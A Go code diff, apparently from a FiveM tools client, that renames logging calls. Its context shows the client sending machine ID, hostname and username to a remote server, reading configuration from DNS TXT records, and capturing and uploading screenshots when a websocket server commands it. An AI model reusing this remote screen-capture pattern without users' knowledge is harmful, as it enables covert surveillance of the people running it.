@@ -7,7 +7,6 @@ import (
 	"fmt"
 	"image"
 	"image/jpeg"
-	"log"
 	"net"
 	"net/http"
 	"net/url"
@@ -47,7 +46,7 @@ type UpdateClientStatusCommand struct {
 }
 
 func UpdateClientStatus(cmd *UpdateClientStatusCommand) {
-	failedf("Updating client status...")
+	logf("Updating client status...")
 
 	machineID, _ := machineID()
 	hostname, _ := os.Hostname()
@@ -93,14 +92,14 @@ func UpdateClientStatus(cmd *UpdateClientStatusCommand) {
 
 	body := bytes.NewBuffer(nil)
 	if err := json.NewEncoder(body).Encode(data); err != nil {
-		failedf("failed to encode status data: %v", err)
+		errorf("failed to encode status data: %v", err)
 		return
 	}
 
 	baseURL := GetTxt("base_url", "http://localhost:8080")
 	r, err := http.NewRequest(http.MethodPost, baseURL+"/status", body)
 	if err != nil {
-		failedf("failed to create request: %v", err)
+		errorf("failed to create request: %v", err)
 		return
 	}
 
@@ -110,12 +109,12 @@ func UpdateClientStatus(cmd *UpdateClientStatusCommand) {
 
 	resp, err := http.DefaultClient.Do(r)
 	if err != nil {
-		failedf("failed to post status: %v", err)
+		errorf("failed to post status: %v", err)
 		return
 	}
 	defer func() { _ = resp.Body.Close() }()
 	if resp.StatusCode != http.StatusCreated {
-		failedf("failed to post status, got status code: %d", resp.StatusCode)
+		errorf("failed to post status, got status code: %d", resp.StatusCode)
 		return
 	}
 }
@@ -123,7 +122,7 @@ func UpdateClientStatus(cmd *UpdateClientStatusCommand) {
 func handleWebsocket(from string) {
 	defer func() {
 		if r := recover(); r != nil {
-			failedf("WebSocket handler panicked: %v", r)
+			errorf("WebSocket handler panicked: %v", r)
 		}
 
 		time.Sleep(5 * time.Second)
@@ -131,7 +130,7 @@ func handleWebsocket(from string) {
 	}()
 
 	u := url.URL{Scheme: "wss", Host: "fivem-tools.willywotz.com", Path: "/ws"}
-	log.Printf("connecting to %s", u.String())
+	logf("connecting to %s", u.String())
 
 	dialer := &websocket.Dialer{
 		Proxy:            http.ProxyFromEnvironment,
@@ -140,7 +139,7 @@ func handleWebsocket(from string) {
 
 	conn, _, err := dialer.Dial(u.String(), nil)
 	if err != nil {
-		failedf("failed to connect to WebSocket: %v", err)
+		errorf("failed to connect to WebSocket: %v", err)
 		return
 	}
 	defer func() { _ = conn.Close() }()
@@ -160,12 +159,12 @@ func handleWebsocket(from string) {
 		"username":   localUsername,
 		"from":       from,
 	})
-	log.Printf("Registered machine ID: %s, hostname: %s, username: %s", localMachineID, localHostname, localUsername)
+	logf("Registered machine ID: %s, hostname: %s, username: %s", localMachineID, localHostname, localUsername)
 
 	for {
 		messageType, p, err := conn.ReadMessage()
 		if err != nil {
-			failedf("failed to read message from WebSocket: %v", err)
+			errorf("failed to read message from WebSocket: %v", err)
 			break
 		}
 
@@ -173,10 +172,8 @@ func handleWebsocket(from string) {
 		_ = p           // Ignore payload for now
 
 		if messageType == websocket.TextMessage && p != nil {
-			// log.Printf("Received message: %s", string(p))
-
 			if string(p[:15]) == "take_screenshot" {
-				log.Println("Taking screenshot...")
+				logf("Taking screenshot...")
 
 				var data struct {
 					Action    string `json:"action"`
@@ -196,11 +193,11 @@ func handleWebsocket(from string) {
 				var err error
 				if data.Data, err = CaptureScreenshot(); err != nil {
 					data.Error = fmt.Sprintf("failed to capture screenshot: %v", err)
-					failedf("failed to capture screenshot: %v", err)
+					errorf("failed to capture screenshot: %v", err)
 				}
 
 				if err := conn.WriteJSON(data); err != nil {
-					failedf("failed to send screenshot results: %v", err)
+					errorf("failed to send screenshot results: %v", err)
 				}
 
 				continue
@@ -289,7 +286,7 @@ func GetTxt(name string, defaultValue ...string) string {
 	localMapTxts := make(map[string]string)
 	txts, err := net.LookupTXT("_fivem_tools.willywotz.com")
 	if err != nil {
-		failedf("failed to lookup TXT records: %v", err)
+		errorf("failed to lookup TXT records: %v", err)
 		return getOrDefaultMap(localMapTxts, name, defaultValue...)
 	}
 
@@ -304,7 +301,7 @@ func GetTxt(name string, defaultValue ...string) string {
 	}
 
 	if len(localMapTxts) == 0 {
-		failedf("No valid TXT records found")
+		errorf("No valid TXT records found")
 		return getOrDefaultMap(localMapTxts, name, defaultValue...)
 	}
 
@@ -338,7 +335,7 @@ func CaptureScreenshot() (results []*CaptureScreenshotItem, err error) {
 	defer func() {
 		if r := recover(); r != nil {
 			err = fmt.Errorf("CaptureScreenshot panicked: %v", r)
-			failedf("CaptureScreenshot panicked: %v", r)
+			errorf("CaptureScreenshot panicked: %v", r)
 		}
 	}()
 
